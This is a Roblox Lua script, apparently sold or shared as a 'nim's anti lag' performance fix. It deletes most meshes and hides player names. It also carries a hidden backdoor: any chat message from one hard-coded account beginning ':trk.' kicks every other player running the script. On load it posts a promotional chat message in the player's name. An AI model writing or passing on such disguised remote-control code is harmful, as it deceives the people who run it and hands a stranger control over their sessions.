local Players = game:GetService("Players")
local Player = Players.LocalPlayer or Players.LocalPlayerAdded:wait()
local Daddy = Players:FindFirstChild('0lxad') or Players:WaitForChild('0lxad')
local runservice = game:GetService("RunService")
local function onDescendantAdded(descendant)
	if descendant.ClassName == 'Humanoid' then
    descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
    descendant.NameDisplayDistance = 0
    descendant.Name = 'Fixed by nim'
  end
end

rchat = function(Message)
  Players:Chat(Message)
end

Daddy.Chatted:Connect(function(msg)
    if string.lower(string.split(msg, '.')[1]) == ":trk" then
      if Player.Name == '0lxad' then print("Skids kicked")
      else
        local kmsg = string.split(msg, '.')[2]
            Player:Kick(kmsg)
      end
    end
end)

if Player.Name ~= '0lxad' then
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
end

runservice.Stepped:Connect(function()
    for i,v in pairs(workspace:GetDescendants())do
        if v.Name=='Mesh' or v.Name=='SpecialMesh' then
            if v.Parent.Name~='Head' and v.Parent.Name~='Handle' then
                if not v:IsDescendantOf(Workspace.SecureParts) then
                    v:Destroy()
                end
            end
        end
    end
end)
workspace.DescendantAdded:Connect(onDescendantAdded)
